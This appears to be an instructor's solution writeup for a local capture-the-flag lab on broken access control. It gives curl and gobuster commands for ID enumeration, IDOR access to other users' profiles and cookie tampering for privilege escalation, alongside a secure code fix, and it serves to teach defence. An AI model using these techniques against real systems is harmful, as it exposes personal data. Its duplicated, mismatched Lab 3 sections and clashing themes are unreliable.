# A01: Broken Access Control - Instructor Writeup

**Lab URL:** http://localhost:3001  
**Topic:** OWASP Top 10 2025 - A01: Broken Access Control  
**Difficulty:** Easy → Medium → Hard  
**Theme:** TechCorp Global HR System

---

## Overview

This lab teaches students about Broken Access Control vulnerabilities through progressive challenges using a realistic corporate HR portal. Students learn enumeration techniques, IDOR (Insecure Direct Object References) to access PII/salary data, and privilege escalation to gain HR admin access.

### Real-World Impact
- **PII Data Breach:** Unauthorized access to employee SSNs, salaries, performance reviews
- **Insider Trading Risk:** Access to C-suite compensation and stock options
- **Compliance Violations:** GDPR, CCPA violations for unauthorized PII access
- **Privilege Escalation:** Regular employee gaining HR admin privileges

### Learning Objectives
- Understand horizontal and vertical privilege escalation in corporate systems
- Practice API enumeration to discover employee records
- Identify IDOR vulnerabilities exposing sensitive HR data
- Exploit cookie-based authentication to escalate privileges
- Learn proper access control implementation for enterprise systems

---

## EXAMPLE: Getting Started Guide

**URL:** http://localhost:3001/example  
**Purpose:** Educational walkthrough with 4 parts teaching basic exploitation techniques

### Part 1: DevTools Discovery
**Objective:** Discover hidden members by trying different IDs

**Solution:**
1. Visit `/api/example/part1/member/1` in browser
2. Try IDs 2, 3, 4 to see different employees
3. Try ID 108 to find hidden employee records
4. **Flag:** `NSA{D3VT00LS_M4ST3R}`

**Teaching Point:** Sequential ID enumeration is a common way to discover hidden resources in HR systems.

### Part 2: cURL Command Line
**Objective:** Access API using command-line tools

**Solution:**
```bash
curl http://localhost:3001/api/example/part2/test
```

**Flag:** `NSA{CURL_C0MM4ND3R}`

**Teaching Point:** APIs often behave differently when accessed via different clients. Understanding HTTP fundamentals is critical.

### Part 3: Request Interception
**Objective:** Modify request parameters to escalate privileges

**Solution:**
1. Visit `/api/example/part3/intercept` (default: employee access)
2. Add parameter: `/api/example/part3/intercept?access=manager`
3. **Flag:** `NSA{BURP_1NT3RC3PT0R}`

**Teaching Point:** Never trust client-provided access control parameters. Access decisions must be made server-side based on authenticated session data.

### Part 4: Sequential Enumeration
**Objective:** Find all employees by systematically trying IDs

**Solution:**
```bash
# Manual approach
curl http://localhost:3001/api/example/part4/enumerate/100
curl http://localhost:3001/api/example/part4/enumerate/101
# ... continue through 105

# Automated approach
for i in {100..105}; do
  curl http://localhost:3001/api/example/part4/enumerate/$i
done
```

**Flag:** `NSA{3NUM3R4T10N_PR0}` (after finding all employees)

**Teaching Point:** Predictable, sequential IDs allow complete database enumeration exposing entire employee roster.

---

## LAB 1: Employee Directory (EASY - Recon/Scanning)

**URL:** http://localhost:3001/lab1  
**Challenge:** Enumerate employee profiles to discover all users in the organization  
**Stage:** Recon/Scanning  

### Vulnerability
Horizontal privilege escalation through unrestricted API access. Any employee can view detailed profiles of any other employee, including sensitive HR data.

### Required Tools
- `gobuster` - Directory/API enumeration
- `curl` - HTTP API testing
- Browser DevTools - Request inspection

### Exploitation Steps

1. **Reconnaissance - Discover API Endpoints:**
   ```bash
   # Enumerate hidden endpoints
   gobuster dir -u http://localhost:3001 \
     -w /usr/share/wordlists/dirb/common.txt \
     -t 50
   
   # Look for /api/ paths specifically
   gobuster dir -u http://localhost:3001/api \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
     -t 50
   ```

2. **API Pattern Discovery:**
   ```bash
   # Test API with sequential IDs
   curl http://localhost:3001/api/members/user/1
   curl http://localhost:3001/api/members/user/2
   curl http://localhost:3001/api/members/user/3
   ```

3. **Automated Enumeration:**
   ```bash
   # Enumerate all employees (1-10)
   for i in {1..10}; do
     echo "=== Employee ID $i ==="
     curl -s http://localhost:3001/api/members/user/$i | jq '.'
     sleep 0.5
   done
   ```

4. **Extract Flag - ID 4 contains the flag:**
   ```bash
   curl -s http://localhost:3001/api/members/user/4 | jq '.flag'
   ```
### Flag
`NSA{F0UND_TH3_US3RS}`

### Expected Output
```json
{
  "id": 4,
  "username": "emily_instructor",
  "email": "emily.chen@techcorp-global.com",
  "role": "instructor",
  "membership": "Premium",
  "flag": "NSA{F0UND_TH3_US3RS}",
  "message": "You have successfully enumerated all community members!",
  "stats": {
    "totalMembers": 4,
    "members": 3,
    "instructors": 1
  }
}
```

### Sensitive Data Exposed
- Employee names, titles, departments
- Email addresses and employee IDs
- Hire dates and job roles
- Manager and executive information
- Security clearance levels

---

## LAB 2: My Profile (MEDIUM - Initial Access)

**URL:** http://localhost:3001/lab2  
**Challenge:** Access other employees' private profile information including salary and SSN  
**Stage:** Initial Access  

### Vulnerability
IDOR (Insecure Direct Object Reference) allows any user to access any profile by changing the ID parameter.

### Required Tools
- `curl` - HTTP API testing
- `jq` - JSON parsing (optional but recommended)

### Exploitation Steps

1. **Access Your Own Profile:**
   ```bash
   # Default user ID is 1
   curl http://localhost:3001/api/profile/user/1
   ```

2. **Test IDOR - Access Other Profiles:**
   ```bash
   # Try accessing user ID 2 (should be denied in secure systems)
   curl http://localhost:3001/api/profile/user/2
   
   # Try user ID 3
   curl http://localhost:3001/api/profile/user/3
   ```

3. **Extract Sensitive Data:**
   ```bash
   # Get all profiles with formatted output
   for i in {1..4}; do
     echo "=== Profile $i ==="
     curl -s http://localhost:3001/api/profile/user/$i | jq '{username, email, creditCard, flag}'
     echo ""
   done
   ```

4. **Capture Flag:**
   ```bash
   # Flag appears when accessing someone else's profile
   curl -s http://localhost:3001/api/profile/user/2 | grep -o 'NSA{[^}]*}'
   ```

### Flag
`NSA{1D0R_V1CT1M_4CC3SS}`

### Expected Output
```json
{
  "id": 2,
  "username": "james_rodriguez",
  "email": "james.rodriguez@techcorp-global.com",
  "role": "member",
  "membership": "Basic",
  "creditCard": "4532-XXXX-XXXX-1234",
  "renewalDate": "2026-03-15",
  "flag": "NSA{1D0R_V1CT1M_4CC3SS}",
  "_vuln_note": "Unauthorized access: You accessed another member's private profile!"
}
```

### Sensitive Data Exposed
- Full email addresses
- Credit card last 4 digits
- Membership renewal dates
- Private role information

---

## LAB 3: HR Admin Dashboard (HARD - Privilege Escalation)

**URL:** http://localhost:3001/lab3  
**Challenge:** Escalate privileges from regular employee to HR administrator  
**Stage:** Privilege Escalation  

### Vulnerability
Cookie-based authorization with client-side role checking. Users can modify cookies to escalate privileges.

### Required Tools
- `curl` with cookie manipulation
- Browser DevTools - Application tab (Cookie editing)

### Exploitation Steps

**Method 1: Using curl with Modified Cookies**

1. **Identify Current Cookie Values:**
   ```bash
   # Regular employee cookies
   curl -v http://localhost:3001/lab3 2>&1 | grep -i cookie
   ```

2. **Attempt Access with Modified Cookies:**
   ```bash
   # Try to access as instructor by setting role cookie
   curl http://localhost:3001/lab3 \
     -H "Cookie: userRole=instructor; userId=4" \
     | grep -o 'NSA{[^}]*}'
   ```

3. **Access Admin API Directly:**
   ```bash
   # Access instructor dashboard API
   curl http://localhost:3001/api/instructor/user/4/dashboard
   ```

**Method 2: Using Browser DevTools**

1. Open http://localhost:3001/lab3 in browser
2. Press F12 → Application tab → Cookies
3. Modify cookies:
   - `userRole`: Change from `member` to `instructor`
   - `userId`: Change to `4` (instructor ID)
4. Refresh the page to see admin dashboard
5. Flag appears immediately

---

## LAB 3: HR Admin Dashboard (HARD - Privilege Escalation)

**URL:** http://localhost:3001/lab3  
**Challenge:** Escalate privileges to access HR administrator dashboard  
**Stage:** Maintained Access (Privilege Escalation)  

### Vulnerability
Vertical privilege escalation - regular employees can access HR admin functionality by manipulating client-side authentication tokens (cookies).

### Exploitation Steps

1. **Identify Target:** Note that HR managers have administrative dashboards
2. **Current User:** You are Maria Rodriguez (ID 2, role: 'employee')
3. **Target User:** HR Director Sarah Kumar (ID 4, role: 'manager')
4. **Cookie Manipulation:**
   - Open DevTools (F12) → Application/Storage → Cookies
   - Modify `userRole` cookie from `employee` to `manager`
   - Modify `userId` cookie from `2` to `4`
   - Refresh the page
5. **Capture Flag:** Successfully access HR admin dashboard

### Flag
`NSA{R00T_4CC3SS_4CH13V3D}`

### Sensitive Data Exposed
- Class schedules and student rosters
- Student attendance statistics
- Teaching resources and lesson plans
- Instructor performance metrics

### Vulnerable Code Pattern
```javascript
app.get('/api/instructor/user/:id/dashboard', (req, res) => {
    const userId = parseInt(req.params.id);
    const user = users.find(u => u.id === userId);
    
    // CRITICAL VULNERABILITY: Checks the REQUESTED user's role, not CURRENT user's role
    if (user.role !== 'instructor') {
        return res.status(403).json({ error: 'Access Denied' });
    }
    
    // If we get here, we're checking user from URL, not session!
    // Regular users can access by requesting an instructor's ID
    res.json({
        success: true,
        dashboard: { /* instructor data */ },
        flag: 'FLAG{PR1V1L3G3_3SC4L4T10N_1NSTRUCT0R}'
    });
});
```

### Root Cause
The application checks if the **requested** user (from URL parameter) is an instructor, but not if the **authenticated session user** is an instructor. This allows any user to access instructor functionality by simply changing the URL parameter to an instructor's ID.

### Secure Implementation
```javascript
app.get('/api/instructor/dashboard', (req, res) => {
    // Get authenticated user from session, not URL
    const currentUser = users.find(u => u.id === req.session.userId);
    
    // SECURITY: Check CURRENT user's role from authenticated session
    if (!currentUser || currentUser.role !== 'instructor') {
        return res.status(403).json({ error: 'Access Denied: Instructor access required' });
    }
    
    // Only return data for the authenticated instructor
    res.json({
        success: true,
        dashboard: getInstructorDashboard(currentUser.id)
    });
});
```

### Key Security Principles
1. **Never trust client input for authorization decisions**
2. **Always use authenticated session data for role checks**
3. **Don't use URL parameters to determine access rights**
4. **Authorization must happen on the server, never client-side**

### Hints for Students
- "Instructors have access to special dashboards"
- "How does the application know if you're an instructor?"
- "What if you request the dashboard for an instructor's user ID?"

---

## Common Student Questions

**Q: Why is broken access control #1 on OWASP Top 10?**  
A: It's the most common and impactful vulnerability. 94% of applications tested had some form of broken access control. It allows attackers to access unauthorized data or functionality.

**Q: What's the difference between IDOR and privilege escalation?**  
A: IDOR is horizontal (accessing peers' data), privilege escalation is vertical (accessing higher-privilege functionality). Both are broken access control issues.

**Q: How do real applications prevent these attacks?**  
A: Through proper authentication, session management, and server-side authorization checks. Never trust client input for access decisions.

**Q: Can we use UUIDs instead of sequential IDs?**  
A: UUIDs help with enumeration but don't solve authorization issues. You still need proper access control checks regardless of ID format.

---

## Remediation Summary

### Key Takeaways
1. ✅ Always verify authentication AND authorization
2. ✅ Check permissions on EVERY request
3. ✅ Use server-side session data for access decisions
4. ✅ Never trust client-provided IDs or role information
5. ✅ Implement deny-by-default access control
6. ✅ Log and alert on access control failures

### Prevention Checklist
- [ ] Implement server-side authorization for all resources
- [ ] Use secure session management
- [ ] Apply principle of least privilege
- [ ] Deny access by default
- [ ] Test access controls with automated tools
- [ ] Log access control failures for monitoring

---

## Additional Resources
- [OWASP Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
- [OWASP Top 10 2025 - A01](https://owasp.org/Top10/A01_2025-Broken_Access_Control/)
- [PortSwigger: Access Control](https://portswigger.net/web-security/access-control)
